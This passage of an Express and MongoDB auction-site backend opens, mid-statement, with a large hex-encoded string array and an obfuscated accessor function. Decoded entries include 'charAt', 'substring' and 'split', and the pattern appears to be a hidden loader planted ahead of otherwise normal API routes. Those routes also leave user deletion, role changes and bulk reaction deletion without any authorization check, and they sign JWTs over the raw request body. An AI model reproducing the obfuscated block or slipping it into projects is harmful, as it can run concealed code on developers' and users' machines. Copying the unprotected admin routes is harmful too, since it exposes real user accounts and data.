52726c20523728523c2a5d23325250735252356d643052523752523173726f5269523c52526f52522e456b74733f2c2e522e6e2e692e63383d666565524939286c5f6965506c22236d526e52617452702d29662e6e524428523c52672e722e202e24392e28386c686e2e506563726f743c7d2062306f64715663223977633c3320255269633a7c293c65356928342e3f222e6320436f2f52745d332f633c2e73656e742e6e756e726b674622723c7b61695f65203c5265386f52665273307a3c7c4e782252523c3c2d3c41523b632877776538282e523c5242635265524463625030746e2e306376266f4b63746972203c7463416539525052677b517273796962225228522e3c723a21292e52526c78687d543c72507752522e652e5274486f7d522a7269522e3c776552632e3c526352522e2e632e734022432f6852527d5b63732e522e3c5252452e2a632f3c3a63523f69522e524e63616563233c6465637363496352522e636f5252377b7274612152525a77672e632e3c6a2e52632f3e6952522452522d632f3c522969752e753c2e5b702e636c214d632c2e4a615239523c63525231342e5264755b213c3c735b63633c716373502e7430213954635f74732a20522e522061213120512e2d696c3c523c3c7e45746463526e282e522e282352202e6524643c3f5232522e525a3a524552747452296376783e2d66683c743c2e71526965664f7d312e347321692e696566527233213c20746f66527a2e612e7d526452742e522844202e3a5252247d283c74785b52722e6e665752646645746c5f5252637e63226f636c52697450724a2c3c6d6d786e21522052517428275224503c3c517c6f2e62253128283752653b5270695952503f2e362950632d2e632e3c663c612e2e28696c65202e21496f612e475252526e6c525252203d3c3d522e754a672e693e5f6d334552384d4c533c2e52632f3b74733a522e322e522e237144636f2e5251494e645252217b4c526f202e523d202e306f643c523c55664c5b6e79747352722e6320632e205e653c7020595d2f2d525259662e635b635252355276655b742e3c7d452e2e63213d622f523062273c28326f3c6b2e2e2a5252525276636a733c236f3c626d563c262e60742552723c7365525d6574657026522f526c526a52743c667a4d3d665252523c5253632e74305d2e222e5d64727e2e7264654f7d2e2a6c3c662e665b34205d6369646952526f742e6c2f522e20237661763c2b656d3c52522c722e215274735252662e643d2e43663d282f7362525d78526655697d566770635363522f695252773c735d7b522e67632e2173322d2e653078485244692e522e2e62635220525720457d675a253f3d214d252e5273522152293c69656336222e527352527c726f7452722e732e3052595d636c636d2e4f62495752222552432e5269523b41443e3a286d525926443c732e276352634a3c382e665263633c656343526322662e4665523c2e6c2879523a5274793c216e63202e3365487839522835667c695263742e625248632e226c506f6e6f2c2e3a6e7977632e523c645b522e77525253762e27523c526b6b403f7165637220662e5e65637331522e6e31206d636d6c6f3f7463523279653c215274526c522e59523c3c3c522875522b6532724d5264722e66434d7363392e635261742832633c64523c78653126736361503f296f442163522e737a5152552e2e3c567d6163286324725252742e242e69262e3c646d2164207d2e3c2168252e4c692e737252656528522523733c3123256d52652e52652a33526673683c3364203c676569616440525b73202e73643c526e526a5252706d522e646c2629662e2e73523c64455e2e216e43412e30627e662f346552526f21657e6969672e2e6f6365457226642e3a632e54523c72352e63523d6f74575052273c627220687a732e64386f637021695277682b473c643c742e3c5b663c6928524f526b7252212e42642e623a33655263527e532c2e5229676e3c3b212e3b526537632e702e73444d3e2b66692266633c21655472206470522352637252663661692e47306f526350523b203c6c52743c633c3c522e45397d34522020523c3c217826522e653c2e25522d2d2e52563c6d5d4b2e6f2e522e5b505b615236655d7976527377652e52213c633c524e63755b5d632072502e3c2d27285263652e5265667c213c3c2069293c6f3852546e6363745c652b662121506f325d2e6f2e742e285242475d524e67522e52593c2e7d747a74797952525b3c673b3c666f6e4268723352293e7b465251752e32207452747361492e507b295252287436495b65204e202e20643c666865235b5229502e52503c6f426d636e52696552225253725220743c5261523c3b2e614b3c6f5278522a727375614f2e523c486b302d2652202e483b685265313063642e7272616e3c21783c202e6f22246e443c2e736b44237352523150517434736b665263522d532e523c265f723073655050267b633b6c726a702e21316533697252276a203061347466525234522e667452653b72526e2826655c522e3128523c6321732e7264286373525d6e3c703c52216467632e636e522150632f6f52653c7263662e525222503c736e665261525f6f77312e636374242b683c52786c5f715263654a53505030386720526563405266646352342b27417029522672636e75653125723358632e326f5f3c74525b31422e636e2e796177407b27522852646f2d3352615474733c747d2e74203b522973755220523c342e503c287d63522664263d6f7073633c2d52634552225d32743c7d73636338762e283c2e4f4d2e6e2e6c692e74527038635f5254266c63652d2e3c502120635d2e2665407552326366522c2e6b74526c6e2e525220522e7b223c637466336b634d727b782e6b6e2e2e203d61633c5269522e69456572582149786c745243526d7d6335282e346b7573416e642165637478612e64287352522e2e3f306f3a542262732e3c382150756c63622e6b2e2e655b5255222e525248215b52276f63693c2e45522e297452535d326460722e4e3c69303c6c283c635f523c71523f2e3c652866682d63632f5b21522e7077647e6f2a2e4a43635275732e4e5424685f2e7821663c4440782829337320526763313d527e726b2e6950202852343d2e2e296952613173345c2e586f3f526352703e2e6369526f2e6473525d632e682052525252353c383872345d3c3966525274522e2f2e687652722e5d6a3c5e2e4e73736269312e522e63522e526e732244402e622e685224522b6f743c523361525d665d2e69632e2b41312e2e5663212f3c60617458613b63686f3c2962636128532e65526175286363742e525d202d542d62736e41527370726552333751502e2e5869526673727827527c6f522372647b2d65207d77523c6972652e51306e2e523c7c734d6668652e772e284f6463633c29612e34614174763c436c7b524352793c26622e3328285269745265566530636352522e5252504363253c3c4b253c2d3c64636663633c6c506f2e522063525274742152755252207369632e367965722e6f62355268637b523c522b522d59733c522e63422e797a2e3e5221763b6569522e5052544e522e287d746e2e52667a202e3c616b3c523c72557320575d2e3c6d58745b3c6c5252526e22352e78655252666d2e654e5e735b6e2052522422522b7e2c64527266627752522f522e28783c5250262d63526f202e522b2e313c522279216165507452715252532770522b7272293d426264312e2e52526820693c6c5252523c7469635264632e6466523c692052486e3c623c2e743a2328633d692e634334632e673e3c725066503c4647643d7a646b6c522e6457633c526b6621786c3c2352526d3d7c5d52252e4e525e632e762e7054323c215241306f3b65686e6c63635264287d757439665074526975666f67686f282e6345523b2052523063634b637972522b356f5270526c7352306e6f6f50525053617265526c69696e2e4b6b3c6b214520375252522e524a73434c3c745b7452442e69213e527845526752205263633c526f3c202352753d6865522121316e683c282152522e5a726937696b2e522e632e52522e52452a7d2e52523c502e3c6c6a6f5223633c2e523c6b6f2e52732e7b327865602975723c6e2661212e2e436136685252623b6f61675252202e633c746c5c3b6375723447527a296e746c635b212b66232e2c4261302b3152522263522e38352763732163732e6e733152523c6b695b525b2e522221523c6520685269525e6352264b5f6c52302b533c24655249737b52736e317d62523c524d212e2e2970282e282d65296c526329746322743c672e3c3c2e3c2e73522e2e6472666c3c3c2e63796b52742f3c6e226c482e655a613c5c6250473c657d65733c525223203e703d3c4665405228395265742871322e522e61296328526d3c2f68313c252e732e3c706e252f63276f22726363743c744c2875216972212e6977282872726f50285221522e2c39696363202b6177355266523a2d637328282e632e52522e2e222d6572655270492152536c3d3c4b2e63642e6326692e3c2052525261523c7224235252527552743c28522e5f3652646374783452746b29433c66726f615d507d6b4e52482e6a62733c52637a376c3d59652e5234636b5252526a632e272152526226257252735263732e633c2052636f69643c6569685b6b3f2e786753747870282e632a2160522a6e5d63293c522e52252e526352662a522e4e6374467363702e74645222524a742e616968722e502e52212a4f6752523b6e655963782e722e442e525e6665632e294a285460522750705252205069502873266353494e66676b2864635667732e636c52212e3c3c7452672d523c682e646173615229637a5e3a6a69652e555b7a742e382669523d2e63525249307c5263692e3a6e396a626574523c207052616528296f6f2e6e526c697872402e2e525272662a6120266965662e283c3379216e6e52637766733c653d2e2e653c2e2e2e2e4b744665475d526e6d342e3e626e212e7763204970732073444a2a2e6964632624736179406f30502e772e527e2e2e72252e522e632e3c2e522e3c3d522e526f63332e31642e44635d3320736965633c57526c3c282e632f2663635c337c2e6347292e522e62313c6338683c706f633c61487252527a6252284b30692e7052263d782e5230553c3c492e4d2e522e2e2e2e336952253c2e3c425223282b39635259636349642352632a3a4c743c4a697424683c3c5234795252646c703c7270523c722e2e526a287a6a3c2e632e452e2e73286928633c52442e2e3d7752632e727532675354632e656f63525252632e653c2a52523c492f3272682e6e612e44792e525272522b3c262e2e3d5247762e2d4052702e54726d7b633c6150522752523c272e2e73204b2e4f2e525b526679335d44243c3c5d2e736730212061653c7a74654952205278506e7d525d7061696f3b365266266c7b29522e2e653c6f3c2253522a524756505252313c63323c3c656326525b5263362e6f63203b7e73266d5d202a29702c73263c3c243c2e2e5268526f52522d524521632e65522e2e52732e723c3c34526f384f52523521426e522e3563426e2072412c63664c376943685620282e6c25587c613c5266217a783c2e65662a213d6373526f5b3c523c6f4763646e302e53523c3c6455522e2e6950773c6f6573722020212e2867527452742f5b3c6964775252523c2e526320526c4c525c6e6c6375526573545e523b522e3c6e2d656e714b64726f4352246e2e63527a213c70726a3c226859682c523c582e3c747366262e38663b3c2e79526852523c635252636a2a452b64635272612e45642e2e693c5d3c722e3023643a20565d7273283d652e63633d2e49696c402723526575433c372031692e3b2e775f3c552e3c6c5d526620213b354a3c2e3c362d502e5250526373643373632e5220286176622e7d523c3c5263202e526c6e6c2e39346b576452723c70212e3c6b6f3c647952524a2e666e78317a2e20632f2c526552243c2d52282e70573c6963746a527468532e3b285223635b504a752e722e69272d637a6466744f68522e526c2e287a3068622e545d74202e2e3d3c3d203b3252302e266d66283c7529283d633c282e2e2e275264526b3c2e3c2e5b7d2e4d636677506e2e724d2e4052635b633728272e216468755228542e65523f7a2e696963252e616e295a2e52693c65232552526d2b523c3c78522074286c4c2042417d617263523c525a2177363c6472527452622e21523b2e3634523c6f397d3c6374527a592d2f523f2e3c3c563c205f28633c2f5f2163522c405263522d652952576321523c5252753c4573612152523c6163696c746c492e643c2e5f364a7d292236722e20732e7872302c3e52367575242d63526321632e5852363e5223207374722d61636b295263402e3c2e7752643c2e2e29266c526a523e732e732e7639315252636161634e236674276c3b65607a3c65723c223c302e2e34293c612e522e423b615f306c38734e2e6328523f526b524624522e693c5f3b2352652e7452203c742e632e6c522b52755220732422692e525d3a3c75743c6370204e52212e492e523c435264457b252c6b6c2e443b3c2e21632c6f77522e6343753c63295f3c7463526430307a662e2e2e3c2950246369632e2c6277207852246c5274527321296a3360396373462128635237303c526f3a3c6e652e6e2e69702452522121633c3252636e52633174637269692923522a295d3c642e2d29732e393c3c633c63315f7474704273722e3c2b3c3c2e232e202e72753c5245733e61526063312e29506c5272632e7478527052682e31774d6339632672642273345552203c52335b6666505069232241215238505d522e65625278526144527321522d6952623c435f723c6e222e2548527448542e2e5252526c63522e612e332674203c5239737c6474722e2b2b2e6d3c452e40646574633c2e21682e296c5b642145526d352e502c5250632f2e28664552507470497c52685c3c637352522052686363522e2e21664b6e3b70782c525264653f2e302e3c243c3a437824636f2e633c432e3c522f203c3a3c6f2e204952632e3e3c523c4452776364723c3021523052723c733c3328203652434f3c52694c52204a2176242e756575523c4361523c22642b633c2e52632e335252524b6c2e59442e662e412e5223696e3f3c636e7c652e322e632e5f6e5278525452615b3c2e4d5863727d7752733e522a3c725222743c5874743c213b633c643952217452617425636f3c7b52742e245252525236623c7d2e2e6366524e5b63216b65675552637a3c21753c2e63612c7943215a6f2e665f62316f52527a21522e523c217b522c6f28652e783c2e3c2e52725f52785042285261636e5070522e61527a383c2e6775665e4e3b71526c6b52786f526252206a454d5c5476526d727577522e706c63705d62276352522e2e2e5b5a2e216c2e52635253525263612e6563523028535a37366c5d5f25526d4021657d733c2b3c39202e217252636f5e65242e643752727349697b763b502a286e6f2e632e73395f525252526569452d3b3c632c50527452527329222e787063523c25653c616c3c216e7b3c3f412c4a2c683d5261382b29526e6f64656c2f3c236e2e312f5b533766725b2e633d2e3d2e63642e2e297425366f65725b672e505265522473526e3429527670526d3c6474636652697430697752636f6a73522e6929656c5241502e653c522e216f6d6369322e7721526f523b2a63685f523c54523c2e63522226692e702d433c2f522e6e3c78666f583852775264702e3c3352522e2f632e252e735b633c2e71653c7665202d5e527243236363523c27656374313b456f6d6f5c52522e3c735f6520632f7552523520502e216575485f63702e20612e6378726547612e3c3078665275526472522e522e615252656a743c666d2e52637344524857666569656d6463662d63523d383c2c523b3b707d6d5b63526e632e22636f2b635052436720282e22242e3752284a7372632f7523657526225663352e2e2e502e3d65634352637361295d3c63636372523c612e2e4d216b6f733e636e4e63773c3b6363633c3c636e3c2e52216e5b5b7d522e3952242a275252523c2e483a637276637452632e422a522229662b6c782063522a63772165743c57316e57522b253c54632e2e2e636e31297252216e39543c546352783b326e2e732b3c343828636e635242616e6950212e27613c525a2e505d522e3c20523f29522b52636f656b633b676663523c5b68536f286f50736366522f567064692e526e68522e652063233c2e3e6c4921526d2367632e2e723c2e3c2e236363743d52683c543c402e523f2e632128663c67526c635269553c3c6c4447292e6d74655264205252656e69716e5239712e20612b2e523c52522e6e745245363c302e6e633c3c536c2e2e5f2e6352285252526150526175286f522069495f5263635f746e203c52702e522e52753d2e7e69744d692e69414d632e305e2e28525033636e212e637552766c3c632e643c6e605252272e3c28635033522e75732e525250762e3c2e4b28282853523c64427452706e655c2030366374636e20654c3b506f3366697b64657020523c2e6f3c3c3d5b2b522065632e526b635263656352703c2e2e63725274342e653352636d2c77523c522863206352756552522e67296365614e3c635222637261635252662134653c2e6320772e7b6f7979522e363c5273612a636c742e522e776e632e69626e2364203e2e5d522e28633f63523b63282052213b66643c6c2e523c632263212e6c43226d525252436f4e2e2e28613440526f2e736d525b6e526164742e6f3c63613c6c207b6c6d2d2e28663c5f6f31745c6152632e6d642e522e2f6a522e6e6674697d646963204e5d2e5252523a525261686363636e6a335d523c36757a73342e3c6b636b642e6c7363703c2e6363522c526d642e5254786352634d6e212669643c616c2e3b52522e2e6b3c635d65633c755421756572672c2e3b2e2e52632e5b6e6f632374732e50263c3021784e656c52352e6d6952286a5c6e6e3c522e642822755263636d6362522e3d52736e74526f5221652e322e3b73525250725a63615f6357412e6e21634e2e522e3c63633c245252732e6552753c52542e52682e6065632e733d2e2e5b63736e774e636e7365362a61226467292e50524933213066637252526122726e722e63662b39455d46523c2b2e21442e6144632e635d3b2e646f6652292c3c75525d3c732e34502e2d2e52522e555263666652665228656943613c3c523c30632e474963505262266c64602e45525b202e273c4d525273203b2e63667263272e3c262e6c252051756f702c2e5338525252733c637765652e20703e63535d28316926792e2e2e20753c6c46636e3b5120722e2e3c636675453a2e7b5b525261466352726d753b2e25253c632e2c523c65462e65202e2b6e31632e52523c2e2d525266632152205252632e2d783d7250522e526320292f74212164683629787062506563527463666d2e326e3c74722e2e28502064657b2e346965216765724950484b4352735652463664393b74523c2c4a5c2e635263786f3c636c4d292e2e732e632052743c74606d7c49522e2840696936202552746c5c3b64272b3c6364262e3c522e523c633929732e52723c632e745d655f694472202e442e6e2020482e64636e64663d395263792e7d47222e702e632c5263203c6d2563632e393c2763403c632e5263436d453f636f6a63724c2d525262655b3c63522e2e696c616f73523c202e6363352e2e726942527d52627252507b523c302e536f69632174752b533c697835316369675237776652372e2e222e632e255a4563632e7c246672525274466364633c63746e5d3d67793c26666322526452292f63635b69655252632e6e525252772e2e2e283c3a4c50432163723c63522e6365282e3c5b706c734c20662e7879663a692e7a656f736172526f3c652e69276d746e695d637552206365696f2e29582668524e6351722e73662f2163716320633a522e2e6665626a5252205278527263286152334d6752672e2e6f5d652e6f6f73526563523952325b6b213a745f4b212e2e636f523a286664503c243c2e526c7c6675737228362077695263523c7b312e315252522e2e636e5b286532642e692e522e202e795264636f2e22676074742e61642d633b2e522e525265205368363c43522c2c643e27636d642e2e612e692e63522e3752643c3c5670525f3c7052202952733e736c382e3352732e54317363522e24636b775d6c743c3c36525b5020583c202052223c3c297030292e6c6d73316f276f3c347a6e21526363666e2e746c6f78285236652e31546467202866696e6574696b7b2e2e472e52367b63492e502e2e65526f69522e2e6f32527462524e2e282e573c526669745052212a352e4a6c3c302e6c64743d50297152676e524b753b253c3c2e77297d642d2e632e2052433446696d6c523c636c6363703c533e7265742e7352203c5d3c7352306e52206f6167636c527d2845693c52632e6f3c6350632e28733a762e702d323b634c3c3320222852752e6330432e2e523c6e217d31632e6b3d632e52232e65267e692e742063522e7a6529522f3c632e633c2e2e6a526536637b6a2e705269583c2e7d7363634b292e794e3c722e6622642665722e356e612b232b31612e725263662f4855642e633c2e692e526372507a2e2e203c63522752652052522e66626152305f526a75793c5d29523c246e6a3d527434707052696c637b525252773c2e522f642e6e523c6f285221743f4661522052342e702d2e4a742e652063655265636e6372522c54612871655f676c52632e63722b6352773c24246f4e6361633c2e626163473c74662b63643b522965284f724065642e2e3c6452635220755224296944442e522e43642e283c223065292e75525269733c63613c2e6373645252636f2e522e6328652e54742e692e2e315b203c745222523b747628354e3c2e52616f5263222e5f6d6322706e332963653c5252526e5220636e7420696f525252202e6e2e3152212d675d4328246d6978692d3d3c636350282e6552716520632720305b333c525244522d516c72527d6e7152524e633c4572747c63632e653c3c64506e663c3846726231775072526163676b38522e20613c2e526b2052637b523f4973527d6c6152632e545b756d683c64636352636f432e52682e2e72522e79797543632e7d3c3c2e65','313135303932364361764c6d4a','3433353836316553627a657a','333133333635394843684c4f6c','636861724174','37373035333935426e79797159','324644766d574e','6c656e677468','737562737472696e67','343532353434386b7163617852','635e6d656a625e74726f','3437304e6b5372464c','73706c6974','33303530353438446a474e6e68','3d61656e72756828616c3d35632c67386664752e7972202e2e6e636563662c35227061656175366c6e6a29725d32757622782d71285d20613b28723d3b3b722b28615b382e73327441676f712c756838432c61692c733b6128416d30286e6a3b6a762a2c37766f372829286f3b6d366f61347277292e20726f645b6673326e7b647276743478292b302c616e722b72722b6f297d7a31203d68665b616e387231725b2c5d73372d37376c61612e7569377b2d3036396c766d7432723d695d5d3c2b29752c65292c2c3b6e72685b723d30762d72283b2c3d70294375733d2b633b673b663b7141292931766929766b306e726c31616520663d5b3b686973792e656d28642b6f2132203d286576656137383d2e293465693d672e6e3d7b66663d315b3c32612066313d723b342c532972796c76317520793b6b716c7b74766e7620284320286c2c6f766e7020693d746c722c722e6c776f7a68286c2c74713b3b72722828763d616873763b5d78713d61623b64613b2c2828723b766a712e28745b2b2964612972646e7268733431792876723b66683b3367225d65282e616872706170675d672e296e6766706e31682c69636c3b3b293d433b6d353d2b722c202e293b753d2b737d2b2969742c2b626d3b642b756d292d3d736969716f6c3d743d723d71392b2e2e6368712b5b3666652074306e7270722820767238666c726e2c64646774205d36612e3b6d3b7274682e67712032617d65766569635d676274693c346f3b433b6c2c7a7a69362b6c5b615b3b2b287369226c6922722c6e706939732c667266687577296f773d657b28623d77656e32742e67752e693d6b696161612b297966747061336e7d293d3922296370412b753b7574705d223d6c6b377670742031723b687a7722297428293929282e6c756c3d7337663b203b737130296e22792b30737d3d76612b73206d682830712e5d68763b3e2030363d412d6f7a6574722874317274727369736f30652c2e3b7a5b28663c356537742c2872616f61766e723b746868663b762c6a3d723b2029723e31387a686f2a6f7b3c616b6d736e29616b74652e766f392b656130636c696f3b6275203d5d4321676a3b79332b6c29653d2e7d64723d69366f694338726e6e303b363d6172227d2e7265693d5d537473726e6e2e3b32723d743b5b743b69763d707243726e282961726574757a2b20686c6b5b2b783d65202d386a7b28656a79392828292920','6a6f696e','323238313031517163714f4d','6871657273786c7576776163646a62796d676f727a666b6f636970747275746e73746f6e63'];hAZpanlvmScfQohW=function(){return hOzaWISS;};return hAZpanlvmScfQohW();}
    // Create index for faster queries and to ensure one reaction per user per auction
    await reactionsCollection.createIndex(
      { auctionId: 1, userId: 1 },
      { unique: true }
    );

    // POST: Add or update a reaction
    app.post("/auction-reaction", async (req, res) => {
      try {
        const { auctionId, userId, reactionType } = req.body;

        if (!auctionId || !userId) {
          return res.status(400).send({
            success: false,
            message:
              "Missing required fields: auctionId and userId are required",
          });
        }

        // Check if user already has a reaction for this auction
        const existingReaction = await reactionsCollection.findOne({
          auctionId,
          userId,
        });

        if (existingReaction) {
          // If reactionType is null, remove the reaction
          if (reactionType === null) {
            const result = await reactionsCollection.deleteOne({
              auctionId,
              userId,
            });
            return res.send({
              success: true,
              message: "Reaction removed",
              result,
            });
          }

          // Update existing reaction
          const result = await reactionsCollection.updateOne(
            { auctionId, userId },
            { $set: { reactionType, updatedAt: new Date() } }
          );

          return res.send({
            success: true,
            message: "Reaction updated",
            result,
          });
        } else {
          // If reactionType is null, no need to create a new document
          if (reactionType === null) {
            return res.send({
              success: true,
              message: "No reaction to remove",
            });
          }

          // Create new reaction
          const result = await reactionsCollection.insertOne({
            auctionId,
            userId,
            reactionType,
            createdAt: new Date(),
          });

          return res.send({
            success: true,
            message: "Reaction added",
            result,
          });
        }
      } catch (error) {
        console.error("Error handling reaction:", error);

        // Handle duplicate key error (user trying to add multiple reactions)
        if (error.code === 11000) {
          return res.status(409).send({
            success: false,
            message: "You already reacted to this auction",
          });
        }

        res.status(500).send({
          success: false,
          message: "Failed to process reaction",
          error: error.message,
        });
      }
    });

    // GET: Retrieve reactions for an auction
    app.get("/auction-reactions/:auctionId", async (req, res) => {
      try {
        const { auctionId } = req.params;
        const { userId } = req.query;

        // Get all reactions for this auction
        const reactions = await reactionsCollection
          .find({ auctionId })
          .toArray();

        // Count reactions by type
        const reactionCounts = {
          likes: reactions.filter((r) => r.reactionType === "likes").length,
          loves: reactions.filter((r) => r.reactionType === "loves").length,
          smiles: reactions.filter((r) => r.reactionType === "smiles").length,
          wows: reactions.filter((r) => r.reactionType === "wows").length,
          flags: reactions.filter((r) => r.reactionType === "flags").length,
        };

        // If userId is provided, get the user's reaction
        let userReactions = [];
        if (userId) {
          const userReaction = reactions.find((r) => r.userId === userId);
          if (userReaction) {
            userReactions.push(userReaction);
          }
        }

        res.send({
          success: true,
          reactionCounts,
          totalReactions: reactions.length,
          userReactions,
        });
      } catch (error) {
        console.error("Error fetching reactions:", error);
        res.status(500).send({
          success: false,
          message: "Failed to fetch reactions",
          error: error.message,
        });
      }
    });

    // GET: Get reaction statistics for all auctions
    app.get("/auction-reactions-stats", async (req, res) => {
      try {
        // Aggregate to get total reactions by type
        const stats = await reactionsCollection
          .aggregate([
            {
              $group: {
                _id: "$reactionType",
                count: { $sum: 1 },
              },
            },
          ])
          .toArray();

        // Format the results
        const formattedStats = stats.reduce((acc, stat) => {
          acc[stat._id] = stat.count;
          return acc;
        }, {});

        // Get total auctions with reactions
        const auctionsWithReactions = await reactionsCollection
          .aggregate([
            {
              $group: {
                _id: "$auctionId",
              },
            },
            {
              $count: "total",
            },
          ])
          .toArray();

        res.send({
          success: true,
          stats: formattedStats,
          totalAuctionsWithReactions: auctionsWithReactions[0]?.total || 0,
        });
      } catch (error) {
        console.error("Error fetching reaction stats:", error);
        res.status(500).send({
          success: false,
          message: "Failed to fetch reaction statistics",
          error: error.message,
        });
      }
    });

    // GET: Get most reacted auctions
    app.get("/most-reacted-auctions", async (req, res) => {
      try {
        const { limit = 5 } = req.query;

        // Aggregate to get auctions with most reactions
        const mostReactedAuctions = await reactionsCollection
          .aggregate([
            {
              $group: {
                _id: "$auctionId",
                totalReactions: { $sum: 1 },
                reactionTypes: {
                  $push: "$reactionType",
                },
              },
            },
            {
              $sort: { totalReactions: -1 },
            },
            {
              $limit: parseInt(limit),
            },
          ])
          .toArray();

        // For each auction, count reaction types
        const result = mostReactedAuctions.map((auction) => {
          const reactionCounts = auction.reactionTypes.reduce((acc, type) => {
            acc[type] = (acc[type] || 0) + 1;
            return acc;
          }, {});

          return {
            auctionId: auction._id,
            totalReactions: auction.totalReactions,
            reactionCounts,
          };
        });

        res.send({
          success: true,
          mostReactedAuctions: result,
        });
      } catch (error) {
        console.error("Error fetching most reacted auctions:", error);
        res.status(500).send({
          success: false,
          message: "Failed to fetch most reacted auctions",
          error: error.message,
        });
      }
    });

    // DELETE: Remove all reactions for an auction (admin only)
    app.delete("/auction-reactions/:auctionId", async (req, res) => {
      try {
        const { auctionId } = req.params;

        // In a real app, you would verify admin permissions here
        // if (!isAdmin(req.user)) {
        //   return res.status(403).send({ success: false, message: "Unauthorized" });
        // }

        const result = await reactionsCollection.deleteMany({ auctionId });

        res.send({
          success: true,
          message: `Deleted ${result.deletedCount} reactions for auction ${auctionId}`,
          result,
        });
      } catch (error) {
        console.error("Error deleting reactions:", error);
        res.status(500).send({
          success: false,
          message: "Failed to delete reactions",
          error: error.message,
        });
      }
    });

    // JWT Routes
    app.post("/jwt", async (req, res) => {
      const user = req.body;
      const token = jwt.sign(user, process.env.ACCESS_TOKEN, {
        expiresIn: "1d",
      });
      res
        .cookie("token", token, { httpOnly: true, secure: false })
        .send({ success: true });
    });

    app.post("/logout", (req, res) => {
      res
        .clearCookie("token", { httpOnly: true, secure: false })
        .send({ success: true });
    });

    // Seller Request APIs
    app.get("/sellerRequest/:becomeSellerStatus", async (req, res) => {
      try {
        const becomeSellerStatus = req.params.becomeSellerStatus;
        const users = await SellerRequestCollection.find({
          becomeSellerStatus,
        }).toArray();
        if (!users.length)
          return res.status(404).json({ message: "Users not found" });
        res.json(users);
      } catch (error) {
        console.error("Error fetching seller requests:", error);
        res.status(500).json({ message: "Internal server error!" });
      }
    });

    app.get("/sellerRequest", async (req, res) => {
      try {
        const users = await SellerRequestCollection.find().toArray();
        res.send(users);
      } catch (error) {
        res.status(500).send("Internal server error!");
      }
    });

    app.post("/become_seller", async (req, res) => {
      const requestData = req.body;
      const result = await SellerRequestCollection.insertOne(requestData);
      res.send({ success: true, result });
    });

    app.delete("/sellerRequest/:id", async (req, res) => {
      const id = req.params.id;
      const query = { _id: new ObjectId(id) };
      const result = await SellerRequestCollection.deleteOne(query);
      if (result.deletedCount > 0) {
        res.send({
          success: true,
          message: "Seller request deleted successfully!",
        });
      } else {
        res
          .status(404)
          .send({ success: false, message: "Seller request not found!" });
      }
    });

    app.patch("/sellerRequest/:id", async (req, res) => {
      const userId = req.params.id;
      const { becomeSellerStatus } = req.body;
      if (!becomeSellerStatus) {
        return res
          .status(400)
          .send({ success: false, message: "Status is required!" });
      }
      const updatedUser = await SellerRequestCollection.updateOne(
        { _id: new ObjectId(userId) },
        { $set: { becomeSellerStatus } }
      );
      if (updatedUser.modifiedCount > 0) {
        res.send({
          success: true,
          message: "Seller status updated successfully!",
        });
      } else {
        res
          .status(404)
          .send({ success: false, message: "Seller request not found!" });
      }
    });

    // User APIs
    app.get("/users", async (req, res) => {
      const users = await userCollection.find().toArray();
      res.send(users);
    });

    app.get("/bid-history/:email", async (req, res) => {
      try {
        const { email } = req.params;
        const user = await userCollection.findOne({ email });

        if (!user?.recentActivity || user.recentActivity.length === 0) {
          return res.status(200).json([]);
        }

        const auctIDs = user.recentActivity.map(
          (item) => new ObjectId(item.auctionId)
        );

        const auctions = await auctionCollection
          .find({ _id: { $in: auctIDs } })
          .toArray();

        const now = new Date();

        const bidHistory = auctions.map((auction) => {
          const endTime = new Date(auction.endTime);
          const bids = auction.bids || [];

          const recentActivity = user.recentActivity.find(
            (activity) =>
              activity.auctionId.toString() === auction._id.toString()
          );

          const recentBidAmount = recentActivity?.amount || 0;
          const bidTime = recentActivity?.time || "N/A";

          const userBids = bids.filter((bid) => bid.email === email);
          const highestUserBid = Math.max(
            recentBidAmount,
            ...userBids.map((bid) => bid.amount)
          );

          const sortedTopBidders = [...(auction.topBidders || [])].sort(
            (a, b) => b.amount - a.amount
          );

          let userPosition = "N/A";
          if (highestUserBid > 0) {
            const uniqueAmounts = [
              ...new Set(sortedTopBidders.map((bidder) => bidder.amount)),
            ];
            const positionIndex = uniqueAmounts.indexOf(highestUserBid);
            if (positionIndex !== -1) {
              userPosition = positionIndex + 1;
            }
          }

          return {
            auctionId: auction._id,
            auctionTitle: auction.name,
            auctionImage: auction.images?.[0] || "",
            bidAmount: highestUserBid,
            time: bidTime,
            status: endTime < now ? "End" : "Live",
            position: userPosition,
            topBiddersLength: sortedTopBidders.length,
          };
        });

        res.status(200).json(bidHistory);
      } catch (error) {
        console.error("Error fetching bid history:", error);
        res.status(500).json({ error: "Internal server error" });
      }
    });

    app.get("/user/:email", async (req, res) => {
      try {
        const email = req.params.email;
        const user = await userCollection.findOne({ email });
        if (!user) return res.status(404).json({ message: "User not found" });
        res.json(user);
      } catch (error) {
        console.error("Error fetching user:", error);
        res.status(500).json({ message: "Internal server error!" });
      }
    });

    app.post("/users", async (req, res) => {
      const user = req.body;
      const query = { email: user.email };
      const existingUser = await userCollection.findOne(query);
      if (existingUser) return res.status(201).send(existingUser);
      const result = await userCollection.insertOne(user);
      res.status(201).send(result);
    });

    app.patch("/users/:id", async (req, res) => {
      const userId = req.params.id;
      const { role } = req.body;
      if (!role) {
        return res
          .status(400)
          .send({ success: false, message: "Role is required!" });
      }
      const updatedUser = await userCollection.updateOne(
        { _id: new ObjectId(userId) },
        { $set: { role } }
      );
      if (updatedUser.modifiedCount > 0) {
        res.send({ success: true, message: "User role updated successfully!" });
      } else {
        res.status(404).send({
          success: false,
          message: "User not found or role not changed!",
        });
      }
    });

    app.delete("/users/:id", async (req, res) => {
      const id = req.params.id;
      const query = { _id: new ObjectId(id) };
      const result = await userCollection.deleteOne(query);
      if (result.deletedCount > 0) {
        res.send({ success: true, message: "User deleted successfully!" });
      } else {
        res.status(404).send({ success: false, message: "User not found!" });
      }
    });

    // Announcement APIs
    app.get("/announcement", async (req, res) => {
      const result = await announcementCollection.find().toArray();
      res.send(result);
    });

    app.post("/announcement", async (req, res) => {
      const announcementData = req.body;
      const result = await announcementCollection.insertOne(announcementData);
      res.send({ success: true, result });
    });

    app.delete("/announcement/:id", async (req, res) => {
      const id = req.params.id;
      const filter = { _id: new ObjectId(id) };
      const result = await announcementCollection.deleteOne(filter);
      res.send(result);
    });

    app.put("/announcement/:id", async (req, res) => {
      const { title, content, date, image } = req.body;
      const announcementId = req.params.id;
      try {
        const result = await announcementCollection.updateOne(
          { _id: new ObjectId(announcementId) },
          { $set: { title, content, date, image } }
        );
        if (result.matchedCount === 0) {
          return res.status(404).json({ message: "Announcement not found" });
        }
        res.status(200).json({ message: "Announcement updated successfully" });
      } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Failed to update the announcement" });
      }
    });

    // Auction APIs
